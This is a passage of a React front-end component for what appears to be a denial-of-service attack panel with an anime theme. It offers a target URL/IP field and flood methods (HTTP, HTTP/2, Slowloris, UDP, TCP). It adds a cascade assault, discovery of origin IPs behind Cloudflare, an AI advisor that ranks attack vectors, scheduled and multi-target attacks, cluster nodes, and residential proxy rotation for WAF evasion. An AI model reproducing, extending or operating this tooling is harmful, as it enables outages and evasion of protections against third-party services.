          ))}
        </div>

        {/* ── Card ── */}
        <div className={`lb-card ${isRunning ? "lb-card--active" : ""}`}>
          {/* GIF */}
          <div className="lb-gif-wrap">
            <img src={LELOUCH_GIF} alt="Lelouch vi Britannia" className="lb-gif"/>
            <div className="lb-scanlines" aria-hidden="true"/>
            <div className="lb-gif-fade" aria-hidden="true"/>
            <img
              src={GEASS_SYMBOL}
              className={`lb-gif-symbol${isRunning && method === "geass-override" ? " lb-gif-symbol--active" : ""}`}
              aria-hidden="true" alt=""
            />
            {isRunning && (
              <div className={`lb-attack-overlay${method === "geass-override" ? " lb-attack-overlay--geass" : ""}`} aria-hidden="true">
                <span className="lb-attack-overlay-text">
                  {method === "geass-override" ? "ABSOLUTE GEASS OVERRIDE" : "ATTACK IN PROGRESS"}
                </span>
              </div>
            )}
          </div>

          <div className="lb-body">
            {/* Target */}
            <div className="lb-target-row">
              <div className="lb-input-wrap">
                <input
                  className={`lb-input${targetShake ? " lb-input--shake" : ""}`}
                  type="text"
                  placeholder="Enter target URL or IP address"
                  value={target}
                  onChange={e => { setTarget(e.target.value); setShowFavs(false); }}
                  onFocus={() => { if (favorites.length > 0) setShowFavs(true); }}
                  onBlur={() => setTimeout(() => setShowFavs(false), 160)}
                  onKeyDown={e => e.key === "Enter" && handleLaunch()}
                  autoComplete="off"
                />
                {showFavs && (
                  <div className="lb-favs">
                    {favorites.map(f => (
                      <div key={f} className="lb-fav-item">
                        <span className="lb-fav-url" onClick={() => { setTarget(f); setShowFavs(false); }}>{f}</span>
                        <button className="lb-fav-rm" onClick={e => { e.stopPropagation(); removeFavorite(f); }}>✕</button>
                      </div>
                    ))}
                  </div>
                )}
              </div>
              {target.trim() && !favorites.includes(target.trim()) && (
                <button className="lb-star-btn" title="Save target" onClick={() => saveFavorite(target.trim())}>★</button>
              )}
            </div>

            {/* Action row */}
            <div className="lb-action-row">
              <button
                className={`lb-btn-launch ${isRunning ? "lb-btn-stop" : ""}`}
                onClick={handleLaunch}
                disabled={createAttack.isPending}
              >
                <img src={GEASS_SYMBOL} className="lb-btn-glyph-img" alt=""/>
                {isRunning ? "ABORT GEASS" : "COMMAND GEASS"}
              </button>
              <button className="lb-btn-icon lb-btn-gold" title="Clear terminal" onClick={handleClearLogs}>⚡</button>
              <button className="lb-btn-icon lb-btn-dim"  title="Export logs"    onClick={handleExportLogs}>⎘</button>
              <button className={`lb-btn-icon ${soundEnabled ? "lb-btn-gold" : "lb-btn-dim"}`}
                title={soundEnabled ? "Mute" : "Unmute"} onClick={() => setSoundEnabled(v => !v)}>
                {soundEnabled ? "🔊" : "🔇"}
              </button>
              <button
                className={`lb-btn-icon lb-btn-analyze ${isAnalyzing ? "lb-btn-analyzing" : ""}`}
                title="Analyze target"
                onClick={handleAnalyze}
                disabled={isAnalyzing || !target.trim()}
              >
                {isAnalyzing ? "⏳" : "🔍"}
              </button>
              <button
                className="lb-btn-icon lb-btn-bench"
                title="Quick benchmark vs httpbin.org"
                onClick={handleBenchmark}
              >⚗</button>
              <button
                className={`lb-btn-icon lb-btn-origin ${isFindingOrigin ? "lb-btn-analyzing" : ""}`}
                title="Find real origin IP behind Cloudflare (crt.sh + DNS + IPv6 + subdomains)"
                onClick={handleFindOrigin}
                disabled={isFindingOrigin || !target.trim()}
              >
                {isFindingOrigin ? "⏳" : "🕵"}
              </button>
              <button
                className={`lb-btn-icon lb-btn-autorecon ${isAutoRecon || isAnalyzing ? "lb-btn-analyzing" : ""}`}
                title="Auto-Recon: scan target, pick best method, auto-launch"
                onClick={handleAutoRecon}
                disabled={isAutoRecon || isAnalyzing || isRunning || isCascading || !target.trim()}
              >
                {isAutoRecon ? "⏳" : "🎯"}
              </button>
              <button
                className={`lb-btn-icon lb-btn-cascade ${isCascading ? "lb-btn-cascade--active" : ""}`}
                title={`Cascade: 3-phase assault — Conn Flood → Slowloris → WAF Bypass`}
                onClick={handleCascade}
                disabled={isRunning || isCascading || !target.trim()}
              >
                {isCascading ? `P${cascadePhase}` : "⚔"}
              </button>
              <button
                className={`lb-btn-icon lb-btn-analyze ${aiLoading ? "lb-btn-analyzing" : ""}`}
                title="AI Advisor — Lelouch AI analyzes target and recommends best attack vectors"
                onClick={handleAiAdvisor}
                disabled={aiLoading || !target.trim()}
                style={{ background: "#1a0a2e", border: "1.5px solid #8E44AD", color: "#d8b4fe" }}
              >
                {aiLoading ? "⏳" : "🧠"}
              </button>
            </div>
            {/* Cascade phase indicator */}
            {isCascading && cascadePhase > 0 && (
              <div className="lb-cascade-bar">
                <span className={`lb-cascade-phase ${cascadePhase === 1 ? "lb-cascade-phase--active" : cascadePhase > 1 ? "lb-cascade-phase--done" : ""}`}>Conn Flood</span>
                <span className="lb-cascade-arrow">→</span>
                <span className={`lb-cascade-phase ${cascadePhase === 2 ? "lb-cascade-phase--active" : cascadePhase > 2 ? "lb-cascade-phase--done" : ""}`}>Slowloris</span>
                <span className="lb-cascade-arrow">→</span>
                <span className={`lb-cascade-phase ${cascadePhase === 3 ? "lb-cascade-phase--active" : ""}`}>WAF Bypass</span>
              </div>
            )}

            {/* ── Analyzer Panel ── */}
            {showAnalyze && (
              <div className="lb-analyzer">
                <div className="lb-analyzer-header">
                  <span className="lb-analyzer-title">👁 INTELLIGENCE ANALYSIS</span>
                  <button className="lb-analyzer-close" onClick={() => setShowAnalyze(false)}>✕</button>
                </div>

                {isAnalyzing && (
                  <div className="lb-analyzer-loading">
                    <div className="lb-analyzer-spinner"/>
                    <span>Scanning — ports, WAF, H2/H3, origin IP, GraphQL...</span>
                  </div>
                )}

                {!isAnalyzing && analyzeResult && (
                  <>
                    {/* ── Identity Row: host + IP + latency ── */}
                    <div className="lai-identity">
                      <span className="lai-host">{analyzeResult.target}</span>
                      {analyzeResult.ip && (
                        <span className="lai-ip-badge">{analyzeResult.ip}</span>
                      )}
                      {(analyzeResult.allIPs ?? []).length > 1 && (
                        <span className="lai-multi-ip">⇄ {analyzeResult.allIPs.length} IPs</span>
                      )}
                      <span className={`lai-latency lai-latency--${
                        analyzeResult.responseTimeMs === 0 ? "dead"
                        : analyzeResult.responseTimeMs > 600 ? "slow"
                        : analyzeResult.responseTimeMs > 200 ? "warn"
                        : "fast"
                      }`}>
                        {analyzeResult.responseTimeMs > 0 ? `${analyzeResult.responseTimeMs}ms` : "OFFLINE"}
                      </span>
                    </div>

                    {/* ── Server Type + Raw Header ── */}
                    {(analyzeResult.serverHeader || (analyzeResult.serverType && analyzeResult.serverType !== "unknown")) && (
                      <div className="lai-server-row">
                        {analyzeResult.serverType && analyzeResult.serverType !== "unknown" && (
                          <span className={`lai-server-badge lai-server-badge--${analyzeResult.serverType}`}>
                            {analyzeResult.serverLabel || analyzeResult.serverType}
                          </span>
                        )}
                        {analyzeResult.serverHeader && (
                          <span className="lai-server-raw">{analyzeResult.serverHeader}</span>
                        )}
                      </div>
                    )}

                    {/* ── Protocol / Feature Chips ── */}
                    <div className="lai-chips">
                      <span className={`lai-chip ${analyzeResult.httpAvailable  ? "lai-chip--on"  : "lai-chip--off"}`}>HTTP</span>
                      <span className={`lai-chip ${analyzeResult.httpsAvailable ? "lai-chip--on"  : "lai-chip--off"}`}>HTTPS</span>
                      <span className={`lai-chip ${analyzeResult.supportsH2     ? "lai-chip--on"  : "lai-chip--off"}`}>HTTP/2</span>
                      <span className={`lai-chip lai-chip--h3 ${analyzeResult.supportsH3 ? "lai-chip--on" : "lai-chip--off"}`}>HTTP/3</span>
                      <span className={`lai-chip lai-chip--ws  ${analyzeResult.hasWebSocket ? "lai-chip--on" : "lai-chip--off"}`}>WebSocket</span>
                      <span className={`lai-chip lai-chip--gql ${analyzeResult.hasGraphQL  ? "lai-chip--on" : "lai-chip--off"}`}>GraphQL</span>
                      <span className={`lai-chip lai-chip--hsts ${analyzeResult.hasHSTS    ? "lai-chip--on" : "lai-chip--off"}`}>
                        HSTS{analyzeResult.hasHSTS && analyzeResult.hstsMaxAge > 0 ? ` ${Math.round(analyzeResult.hstsMaxAge/86400)}d` : ""}
                      </span>
                      {analyzeResult.hasDNS && (
                        <span className="lai-chip lai-chip--on lai-chip--dns">DNS ✓</span>
                      )}
                    </div>

                    {/* ── CDN / WAF Threat Alerts ── */}
                    {(analyzeResult.isCDN || analyzeResult.hasWAF) && (
                      <div className="lai-threat-row">
                        {analyzeResult.isCDN && (
                          <div className="lai-threat lai-threat--cdn">
                            <span className="lai-threat-icon">☁</span>
                            <div className="lai-threat-body">
                              <span className="lai-threat-label">CDN DETECTED</span>
                              <span className="lai-threat-prov">{analyzeResult.cdnProvider}</span>
                            </div>
                            <span className="lai-threat-note">L7 edge-mitigated</span>
                          </div>
                        )}
                        {analyzeResult.hasWAF && (
                          <div className="lai-threat lai-threat--waf">
                            <span className="lai-threat-icon">🛡</span>
                            <div className="lai-threat-body">
                              <span className="lai-threat-label">WAF DETECTED</span>
                              <span className="lai-threat-prov">{analyzeResult.wafProvider}</span>
                            </div>
                            <span className="lai-threat-note">Use waf-bypass</span>
                          </div>
                        )}
                      </div>
                    )}

                    {/* ── Open Ports ── */}
                    {analyzeResult.openPorts.length > 0 && (
                      <div className="lai-ports">
                        <span className="lai-ports-label">PORTS</span>
                        <div className="lai-ports-list">
                          {analyzeResult.openPorts.map(p => (
                            <span key={p} className="lai-port">{p}</span>
                          ))}
                        </div>
                      </div>
                    )}

                    {/* ── Origin IP Discovery ── */}
                    {analyzeResult.originIP && (
                      <div className="lai-origin">
                        <span className="lai-origin-label">🎯 ORIGIN IP — CLOUDFLARE BYPASS</span>
                        <div className="lai-origin-body">
                          <span className="lai-origin-ip">{analyzeResult.originIP}</span>
                          {analyzeResult.originSubdomain && (
                            <span className="lai-origin-sub">via {analyzeResult.originSubdomain}</span>
                          )}
                          <button className="lai-origin-use" onClick={() => {
                            setTarget(analyzeResult!.originIP!);
                            addLog(`🎯 Target → ${analyzeResult!.originIP} (origin IP — CF bypassed)`, "success");
                            setShowAnalyze(false);
                          }}>USE DIRECT</button>
                        </div>
                      </div>
                    )}

                    {/* ── Ranked Recommendations ── */}
                    <div className="lai-recs-header">
                      <span>VECTORS RANKED — {analyzeResult.recommendations.length} methods scored</span>
                    </div>
                    <div className="lb-recs">
                      {analyzeResult.recommendations.map((rec, i) => (
                        <div key={rec.method} className={`lb-rec ${i === 0 ? "lb-rec--best" : ""}`}>
                          <div className="lrec-left">
                            <span className={`lrec-tier lrec-tier--${rec.tier.toLowerCase()}`}>{rec.tier}</span>
                            <div className="lrec-info">
                              <div className="lrec-name">
                                {i === 0 && <span className="lrec-crown">★ BEST — </span>}
                                {rec.name}
                                {rec.amplification > 1 && <span className="lrec-amp">{rec.amplification}x AMP</span>}
                                <span className="lrec-proto">{rec.protocol}</span>
                              </div>
                              <div className="lrec-reason">{rec.reason}</div>
                              <div className="lrec-bar-wrap">
                                <div className="lrec-bar" style={{ width: `${rec.score}%`, background: rec.score >= 90 ? "#ff0033" : rec.score >= 75 ? "#D4AF37" : rec.score >= 60 ? "#e67e22" : "#666" }}/>
                                <span className="lrec-score">{rec.score}/100</span>
                              </div>
                            </div>
                          </div>
                          <button className={`lrec-use ${i === 0 ? "lrec-use--best" : ""}`}
                            onClick={() => {
                              setMethod(rec.method);
                              setThreads(rec.suggestedThreads);
                              setDuration(rec.suggestedDuration);
                              addLog(`👁 Applied: ${rec.name} — ${rec.suggestedThreads} threads, ${rec.suggestedDuration}s [Tier ${rec.tier}]`, "success");
                              if (soundRef.current) playTone("tick");
                              setShowAnalyze(false);
                            }}>USE</button>
                        </div>
                      ))}
                    </div>
                  </>
                )}
              </div>
            )}

            {/* ── Origin IP Finder Panel ── */}
            {showOriginFinder && (
              <div className="lb-origin-panel">
                <div className="lb-analyzer-header">
                  <span className="lb-analyzer-title">🕵 ORIGIN IP RECON — CLOUDFLARE BYPASS</span>
                  <button className="lb-analyzer-close" onClick={() => setShowOriginFinder(false)}>✕</button>
                </div>
                {isFindingOrigin && (
                  <div className="lb-analyzer-loading">
                    <div className="lb-analyzer-spinner"/>
                    <span>Scanning crt.sh SSL history · DNS subdomains · IPv6 · MX · SPF records...</span>
                  </div>
                )}
                {!isFindingOrigin && originResult && (
                  <div className="lb-origin-body">
                    <div className="lb-origin-summary">
                      <span className="lb-origin-domain">{originResult.domain}</span>
                      <span className={`lb-origin-badge ${originResult.isCloudflare ? "lb-origin-badge--cf" : "lb-origin-badge--direct"}`}>
                        {originResult.isCloudflare ? "☁ CLOUDFLARE DETECTED" : "✓ DIRECT (No CDN)"}
                      </span>
                      {originResult.crtHostsFound > 0 && (
                        <span className="lb-origin-stat">{originResult.crtHostsFound} SSL cert entries scanned</span>
                      )}
                    </div>

                    {originResult.originIPs.length > 0 ? (
                      <div className="lb-origin-found">
                        <div className="lb-origin-found-title">🎯 ORIGIN IP(s) FOUND — BYPASS CLOUDFLARE</div>
                        {originResult.originIPs.map(ip => {
                          const asn = originResult.asnInfo?.[ip];
                          return (
                            <div key={ip} className="lb-origin-ip-row">
                              <span className="lb-origin-ip">{ip}</span>
                              {asn && (
                                <span style={{ fontSize: 10, color: "#9b59b6", marginLeft: 6 }}>
                                  AS{asn.asn} · {asn.name} · {asn.country}
                                </span>
                              )}
                              <button className="lb-origin-use-btn" onClick={() => {
                                setTarget(ip);
                                addLog(`🎯 Target set to origin IP: ${ip}${asn ? ` [AS${asn.asn} ${asn.name}]` : ""} — Cloudflare bypassed!`, "success");
                                if (soundRef.current) playTone("check");
                                setShowOriginFinder(false);
                              }}>USE AS TARGET</button>
                            </div>
                          );
                        })}
                      </div>
                    ) : (
                      <div className="lb-origin-notfound">
                        <span>⚠ No unproxied origin IP found automatically.</span>
                      </div>
                    )}

                    <div className="lb-origin-tip">{originResult.tip}</div>

                    {originResult.findings.filter(f => !f.isCF).length > 0 && (
                      <div className="lb-origin-findings">
                        <div className="lb-origin-findings-title">Non-Cloudflare IPs discovered:</div>
                        {originResult.findings.filter(f => !f.isCF).slice(0, 15).map((f, i) => (
                          <div key={i} className={`lb-origin-finding lb-origin-finding--${f.confidence}`}>
                            <span className={`lb-origin-conf lb-origin-conf--${f.confidence}`}>{f.confidence.toUpperCase()}</span>
                            <span className="lb-origin-f-ip">{f.ip}</span>
                            <span className="lb-origin-f-src">{f.source}</span>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}
              </div>
            )}

            {/* Power level */}
            <div className="lb-power-row">
              <span className="lb-power-label">POWER LEVEL</span>
              <div className="lb-power-bar-track">
                <div className="lb-power-bar-fill" style={{ width: `${pw.pct}%`, background: pw.color }}/>
              </div>
              <span className="lb-power-value" style={{ color: pw.color }}>{pw.label}</span>
            </div>

            {/* Params */}
            <div className="lb-params">
              <div className="lb-field">
                <label>Attack Method</label>
                <select className="lb-select" value={method} onChange={e => setMethod(e.target.value)}>
                  {methods.length === 0
                    ? <>
                        <option value="http-flood">HTTP Flood</option>
                        <option value="http2-flood">HTTP/2 Flood</option>
                        <option value="slowloris">Slowloris</option>
                        <option value="udp-flood">UDP Flood</option>
                        <option value="tcp-flood">TCP Flood</option>
                      </>
                    : methods.map((m: { id: string; name: string }) => <option key={m.id} value={m.id}>{m.name}</option>)
                  }
                </select>
              </div>
              <div className="lb-field">
                <label>Packet Size (bytes)</label>
                <input className="lb-num" type="number" min={1} max={65535} value={packetSize} onChange={e => setPacketSize(+e.target.value)}/>
              </div>
              <div className="lb-field">
                <label>Duration (s)</label>
                <input className="lb-num" type="number" min={1} max={3600} value={duration} onChange={e => setDuration(+e.target.value)}/>
              </div>
              <div className="lb-field">
                <label>Threads</label>
                <input className="lb-num" type="number" min={1} max={5000} value={threads} onChange={e => setThreads(+e.target.value)}/>
              </div>
              <div className="lb-field">
                <label>Packet Delay (ms)</label>
                <input className="lb-num" type="number" min={0} max={10000} value={delay} onChange={e => setDelay(+e.target.value)}/>
              </div>
              <div className="lb-field lb-field--webhook">
                <label className="lb-webhook-toggle" onClick={() => setShowWebhook(v => !v)}>
                  {showWebhook ? "▲" : "▼"} Webhook <span className="lb-opt">optional</span>
                </label>
                {showWebhook && (
                  <input className="lb-num" type="url" placeholder="https://..." value={webhookUrl} onChange={e => setWebhookUrl(e.target.value)}/>
                )}
              </div>

              {/* ── Attack Scheduler ── */}
              <div className="lb-field lb-field--cluster">
                <label className="lb-webhook-toggle" onClick={() => { setShowSchedule(v => !v); if (!showSchedule) loadScheduled(); }}>
                  {showSchedule ? "▲" : "▼"} Schedule Attack <span className="lb-opt">optional</span>
                  {scheduledList.filter(s => s.status === "pending").length > 0 && (
                    <span className="lb-cluster-badge">{scheduledList.filter(s => s.status === "pending").length} PENDING</span>
                  )}
                </label>
                {showSchedule && (
                  <div className="lb-cluster-body">
                    <div className="lb-cluster-hint">Schedule this attack to fire automatically at a future time.</div>
                    <div className="lb-named-save-row">
                      <input
                        className="lb-num"
                        style={{ flex: 1 }}
                        type="datetime-local"
                        value={scheduleTime}
                        onChange={e => setScheduleTime(e.target.value)}
                        min={new Date(Date.now() + 60000).toISOString().slice(0, 16)}
                      />
                      <button
                        className="lb-cluster-add-btn"
                        onClick={handleSchedule}
                        disabled={scheduleLoading}
                        style={{ background: scheduleLoading ? "#555" : "#C0392B", minWidth: 72 }}
                      >
                        {scheduleLoading ? "..." : "SCHEDULE"}
                      </button>
                    </div>
                    {scheduledList.length > 0 && (
                      <div className="lb-cluster-list" style={{ marginTop: 6 }}>
                        {scheduledList.map(s => (
                          <div key={s.id} className="lb-cluster-node lb-named-node">
                            <span className="lb-cluster-node-dot" style={{ background: s.status === "pending" ? "#f39c12" : s.status === "fired" ? "#2ecc71" : "#e74c3c" }}/>
                            <span className="lb-named-label">{s.method.toUpperCase()}</span>
                            <span className="lb-named-url">{new Date(s.scheduledAt).toLocaleString()} · {s.target.slice(0, 30)}</span>
                            <span style={{ fontSize: 10, color: s.status === "pending" ? "#f39c12" : "#2ecc71", marginLeft: 4 }}>{s.status.toUpperCase()}</span>
                            {s.status === "pending" && <button className="lb-fav-rm" onClick={() => cancelScheduled(s.id)}>✕</button>}
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* ── Multi-Target Mode ── */}
              <div className="lb-field lb-field--cluster">
                <label className="lb-webhook-toggle" onClick={() => setShowMultiTarget(v => !v)}>
                  {showMultiTarget ? "▲" : "▼"} Multi-Target Mode
                  {extraTargets.filter(t => t.trim()).length > 0 && (
                    <span className="lb-cluster-badge">{extraTargets.filter(t=>t.trim()).length+1} TARGETS</span>
                  )}
                </label>
                {showMultiTarget && (
                  <div className="lb-cluster-body">
                    <div className="lb-cluster-hint">Attack up to 3 targets simultaneously. Extra targets get 50% of the thread count.</div>
                    {([0, 1] as const).map(idx => (
                      <input
                        key={idx}
                        className="lb-num lb-cluster-input"
                        type="text"
                        placeholder={`Extra target ${idx + 2} (URL or IP)`}
                        value={extraTargets[idx]}
                        onChange={e => setExtraTargets(prev => {
                          const next: [string, string] = [...prev] as [string, string];
                          next[idx] = e.target.value;
                          return next;
                        })}
                      />
                    ))}
                  </div>
                )}
              </div>

              {/* ── Named Targets ── */}
              <div className="lb-field lb-field--cluster">
                <label className="lb-webhook-toggle" onClick={() => setShowNamedTargets(v => !v)}>
                  {showNamedTargets ? "▲" : "▼"} Named Targets
                  {namedTargets.length > 0 && (
                    <span className="lb-cluster-badge">{namedTargets.length} SAVED</span>
                  )}
                </label>
                {showNamedTargets && (
                  <div className="lb-cluster-body">
                    {target.trim() && (
                      <div className="lb-named-save-row">
                        <input
                          className="lb-num"
                          style={{ flex: 1 }}
                          placeholder="Label for current target..."
                          value={newNameLabel}
                          onChange={e => setNewNameLabel(e.target.value)}
                          onKeyDown={e => e.key === "Enter" && saveNamedTarget()}
                        />
                        <button className="lb-cluster-add-btn" onClick={saveNamedTarget}>SAVE</button>
                      </div>
                    )}
                    {namedTargets.length > 0 && (
                      <div className="lb-cluster-list">
                        {namedTargets.map(nt => (
                          <div key={nt.url} className="lb-cluster-node lb-named-node">
                            <span className="lb-cluster-node-dot"/>
                            <span className="lb-named-label" onClick={() => setTarget(nt.url)}>{nt.label}</span>
                            <span className="lb-named-url">{nt.url}</span>
                            <button className="lb-fav-rm" onClick={() => removeNamedTarget(nt.url)}>✕</button>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* ── Custom Presets ── */}
              <div className="lb-field lb-field--cluster">
                <label className="lb-webhook-toggle" onClick={() => setShowCustomPresets(v => !v)}>
                  {showCustomPresets ? "▲" : "▼"} Custom Presets
                  {userPresets.length > 0 && (
                    <span className="lb-cluster-badge">{userPresets.length} SAVED</span>
                  )}
                </label>
                {showCustomPresets && (
                  <div className="lb-cluster-body">
                    <div className="lb-cluster-hint">Save the current config as a named preset.</div>
                    <div className="lb-named-save-row">
                      <input
                        className="lb-num"
                        style={{ flex: 1 }}
                        placeholder="Preset name..."
                        value={newPresetLabel}
                        onChange={e => setNewPresetLabel(e.target.value)}
                        onKeyDown={e => e.key === "Enter" && saveUserPreset()}
                      />
                      <button className="lb-cluster-add-btn" onClick={saveUserPreset}>SAVE</button>
                    </div>
                    {userPresets.length > 0 && (
                      <div className="lb-cluster-list">
                        {userPresets.map(p => (
                          <div key={p.id} className="lb-cluster-node lb-named-node">
                            <span className="lb-cluster-node-dot"/>
                            <span className="lb-named-label" style={{ cursor: "pointer" }} onClick={() => applyUserPreset(p)}>{p.label}</span>
                            <span className="lb-named-url">{p.method} · {p.threads}T · {p.duration}s</span>
                            <button className="lb-fav-rm" onClick={() => deleteUserPreset(p.id)}>✕</button>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                )}
              </div>

              {/* ── Cluster Mode ── */}
              <div className="lb-field lb-field--cluster">
                <label className="lb-webhook-toggle" onClick={() => setShowCluster(v => !v)}>
                  {showCluster ? "▲" : "▼"} Cluster Nodes
                  {clusterNodes.length > 0 && (
                    <span className="lb-cluster-badge">{clusterNodes.length} NODE{clusterNodes.length > 1 ? "S" : ""} — {totalNodes}× POWER</span>
                  )}
                </label>
                {showCluster && (
                  <div className="lb-cluster-body">
                    <div className="lb-cluster-hint">
                      Add deployed API node URLs. Geass Override auto-fans out to all nodes via <code>CLUSTER_NODES</code> env var.
                      {clusterNodes.length > 0 && nodeHealth.length > 0 && (
                        <span className="lb-cluster-health-summary">
                          {" "}— {nodeHealth.filter(n => n.online).length + 1}/{clusterNodes.length + 1} online
                        </span>
                      )}
                    </div>
                    {/* Smart LB toggle */}
                    <label className="lb-smart-lb-toggle">
                      <input type="checkbox" checked={smartLB} onChange={e => {
                        setSmartLB(e.target.checked);
                        localStorage.setItem("lb-smart-lb", e.target.checked ? "1" : "0");
                      }}/>
                      <span className="lb-smart-lb-label">
                        Smart Load Balance — auto-assign different vectors per node
                        {smartLB && clusterNodes.length > 0 && (
                          <span className="lb-smart-lb-preview">
                            {" "}[{["local:" + method, ...clusterNodes.map((_, i) => `n${i+1}:${getSmartMethod(method, i+1)}`)].join(" · ")}]
                          </span>
                        )}
                      </span>
                    </label>
                    <div className="lb-cluster-add-row">
                      <input
                        className="lb-num lb-cluster-input"
                        type="url"
                        placeholder="https://my-api-server.replit.app"
                        value={clusterInput}
                        onChange={e => setClusterInput(e.target.value)}
                        onKeyDown={e => e.key === "Enter" && addClusterNode()}
                      />
                      <button className="lb-cluster-add-btn" onClick={addClusterNode}>ADD</button>
                    </div>
                    {clusterNodes.length > 0 && (
                      <div className="lb-cluster-list">
                        {/* Primary node (self) — always show first */}
                        <div className="lb-cluster-node lb-cluster-node--self">
                          <span className="lb-cluster-node-dot" style={{ background: "#2ecc71", boxShadow: "0 0 6px #2ecc71" }}/>
                          <span className="lb-cluster-node-url">📍 This node (primary)</span>
                          <span className="lb-cluster-node-status lb-cluster-node-status--online">ONLINE</span>
                        </div>
                        {clusterNodes.map((node, nodeIdx) => {
                          const health   = nodeHealth.find(h => h.url === node);
                          const online   = health?.online ?? null;
                          const latency  = health?.latencyMs ?? -1;
                          const dotColor = online === null ? "#888" : online ? latency < 100 ? "#2ecc71" : "#e67e22" : "#C0392B";
                          const isFiring = isRunning && clusterAttackIds.some(a => a.node === node);
                          return (
                            <div key={node} className={`lb-cluster-node ${isFiring ? "lb-cluster-node--active" : ""}`}>
                              <span className="lb-cluster-node-dot" style={{ background: dotColor, boxShadow: `0 0 5px ${dotColor}` }}/>
                              <span className="lb-cluster-node-url">{node}</span>
                              {health && (
                                <span className={`lb-cluster-node-status ${online ? "lb-cluster-node-status--online" : "lb-cluster-node-status--offline"}`}>
                                  {online ? `${latency}ms` : "OFFLINE"}
                                  {health.cpus ? ` · ${health.cpus}cpu` : ""}
                                </span>
                              )}
                              {isFiring && (
                                <span className="lb-cluster-node-firing">
                                  FIRING {smartLB ? `[${getSmartMethod(method, nodeIdx + 1).toUpperCase()}]` : ""}
                                </span>
                              )}
                              <button className="lb-fav-rm" onClick={() => removeClusterNode(node)}>✕</button>
                            </div>
                          );
                        })}
                      </div>
                    )}
                  </div>
                )}
              </div>
              {/* ── Proxy Rotation ── */}
              <div className="lb-field lb-field--cluster">
                <label className="lb-webhook-toggle" onClick={() => setShowProxyPanel(v => !v)}>
                  {showProxyPanel ? "▲" : "▼"} Proxy Rotation
                  {(proxies.length > 0 || residentialInfo) && (
                    <span className={`lb-cluster-badge${proxyEnabled ? " lb-cluster-badge--active" : ""}`}>
                      {proxies.length + (residentialInfo?.count ?? 0)} LIVE{proxyEnabled ? " · ON" : ""}
                    </span>
                  )}
                  {residentialInfo && <span className="lb-cluster-badge" style={{ background: "rgba(155,89,182,0.2)", color: "#9b59b6", borderColor: "rgba(155,89,182,0.4)" }}>🏠 RESIDENTIAL</span>}
                  {proxyFetching && <span className="lb-cluster-badge lb-cluster-badge--fetching">SCANNING...</span>}
                </label>
                {showProxyPanel && (
                  <div className="lb-cluster-body">
                    <div className="lb-cluster-hint">
                      Fetches live HTTP + SOCKS5 proxies from 22 public sources, tests latency, and rotates IPs across all L7 methods. Also supports residential rotating proxies (user:pass@host:port).
                    </div>

                    {/* ── Residential proxy section ── */}
                    <div style={{ marginBottom: "8px" }}>
                      {residentialInfo ? (
                        <div className="lb-proxy-residential" style={{ flexDirection: "column", alignItems: "flex-start", gap: "6px", padding: "10px 12px" }}>
                          <div style={{ display: "flex", alignItems: "center", gap: "8px", width: "100%" }}>
                            <span className="lb-proxy-res-dot"/>
                            <span className="lb-proxy-res-label" style={{ flex: 1 }}>
                              🏠 <strong>{residentialInfo.count}</strong> RESIDENTIAL SLOTS — <code style={{ color: "#9b59b6", fontSize: "0.8em" }}>{residentialInfo.host}:{residentialInfo.port}</code>
                            </span>
                            <span className="lb-proxy-res-badge">ROTATING</span>
                            <button
                              onClick={() => { setShowResForm(v => !v); }}
                              style={{ background: "transparent", border: "1px solid rgba(155,89,182,0.4)", color: "#9b59b6", borderRadius: "4px", padding: "2px 8px", cursor: "pointer", fontSize: "0.75em" }}
                            >{showResForm ? "✕" : "⚙ Edit"}</button>
                          </div>
                          <div style={{ fontSize: "0.72em", color: "#888", paddingLeft: "18px" }}>
                            Each connection exits via a different residential IP — max WAF evasion
                          </div>
                        </div>
                      ) : (
                        <button
                          onClick={() => setShowResForm(v => !v)}
                          style={{ background: "rgba(155,89,182,0.1)", border: "1px solid rgba(155,89,182,0.3)", color: "#9b59b6", borderRadius: "6px", padding: "6px 14px", cursor: "pointer", fontSize: "0.8em", width: "100%" }}
                        >
                          🏠 {showResForm ? "✕ Cancel" : "+ Configure Residential Proxies"}
                        </button>
                      )}

                      {showResForm && (
                        <div style={{ marginTop: "8px", background: "rgba(155,89,182,0.07)", border: "1px solid rgba(155,89,182,0.25)", borderRadius: "6px", padding: "10px" }}>
                          <div style={{ fontSize: "0.75em", color: "#9b59b6", marginBottom: "8px", fontWeight: 700 }}>⚙ RESIDENTIAL PROXY CREDENTIALS</div>
                          <div style={{ display: "grid", gridTemplateColumns: "1fr 80px", gap: "6px", marginBottom: "6px" }}>
                            <input placeholder="host (e.g. proxy.proxying.io)" value={resFormHost} onChange={e => setResFormHost(e.target.value)}
                              style={{ background: "#1a1a2e", border: "1px solid rgba(155,89,182,0.4)", borderRadius: "4px", color: "#fff", padding: "5px 8px", fontSize: "0.8em" }}/>
                            <input placeholder="port" value={resFormPort} onChange={e => setResFormPort(e.target.value)}
                              style={{ background: "#1a1a2e", border: "1px solid rgba(155,89,182,0.4)", borderRadius: "4px", color: "#fff", padding: "5px 8px", fontSize: "0.8em" }}/>
                          </div>
                          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "6px", marginBottom: "6px" }}>
                            <input placeholder="username" value={resFormUser} onChange={e => setResFormUser(e.target.value)}
                              style={{ background: "#1a1a2e", border: "1px solid rgba(155,89,182,0.4)", borderRadius: "4px", color: "#fff", padding: "5px 8px", fontSize: "0.8em" }}/>
                            <input placeholder="password" type="password" value={resFormPass} onChange={e => setResFormPass(e.target.value)}
                              style={{ background: "#1a1a2e", border: "1px solid rgba(155,89,182,0.4)", borderRadius: "4px", color: "#fff", padding: "5px 8px", fontSize: "0.8em" }}/>
                          </div>
                          <div style={{ display: "flex", gap: "6px", alignItems: "center" }}>
                            <input placeholder="slots (25)" value={resFormCount} onChange={e => setResFormCount(e.target.value)}
                              style={{ background: "#1a1a2e", border: "1px solid rgba(155,89,182,0.4)", borderRadius: "4px", color: "#fff", padding: "5px 8px", fontSize: "0.8em", width: "80px" }}/>
                            <button
                              disabled={resSaving || !resFormHost || !resFormUser || !resFormPass}
                              onClick={async () => {
                                setResSaving(true);
                                try {
                                  const r = await fetch(`${BASE}/api/proxies/residential`, {
                                    method: "POST",
                                    headers: { "Content-Type": "application/json" },
